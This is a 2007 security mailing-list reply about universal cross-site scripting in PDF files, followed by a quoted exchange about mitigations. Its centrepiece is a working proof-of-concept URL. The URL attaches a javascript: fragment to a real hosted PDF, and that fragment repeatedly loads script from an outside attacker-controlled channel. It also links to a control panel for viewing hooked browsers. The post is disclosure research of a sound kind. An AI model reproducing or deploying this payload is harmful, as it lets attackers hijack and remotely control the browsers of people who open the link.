
Date: Wed, 3 Jan 2007 22:33:05 +0000
From: "pdp (architect)" <pdp.gnucitizen@...glemail.com>
Cc: bugtraq@...urityfocus.com,
	"Web Security" <websecurity@...appsec.org>
Subject: Re: [WEB SECURITY] Universal XSS with PDF files: highly dangerous

The following POC dynamically backdoors a given PDF document with an
attack channel:

http://www.google.com/librariancenter/downloads/Tips_Tricks_85x11.pdf#something=javascript:setInterval(function
() {var s = document.createElement('script');s.src =
'http://www.gnucitizen.org/carnaval/channel';s.defer = true;s.type =
'text/javascript';document.body.appendChild(s);}, 2000);void(0);

For the purpose of this POC I use carnaval. All hoocked clients can be
previewed by using carnaval's backframe profile:

http://www.gnucitizen.org/carnaval

click on backframe, or directly access the following URL:

http://www.gnucitizen.org/backframe/application.htm?Y2hhbm5lbCgnY2FybmF2YWwnLCAnaHR0cDovL3d3dy5nbnVjaXRpemVuLm9yZy9jYXJuYXZhbC9jaGFubmVsJyk7CnBvcHVsYXRlX2NoYW5uZWxzKCk7



On 1/3/07, Amit Klein <aksecurity@...il.com> wrote:
> pdp (architect) wrote:
> > Amit, this is very interesting solution and it will probably work in
> > most cases. However, if the attacker is able to upload PDF documents,
> > he/she can craft one that will produce the desired result as soon as
> > it gets opend by the user. This can be achieved by setting the PDF
> > file to redirect.
> I agree. I was thinking about a solution to the fragment problem, which
> is the topic of the thread (and a much more widespread situation than
> PDF upload).
>
> -Amit
>


-- 
pdp (architect) | petko d. petkov
http://www.gnucitizen.org
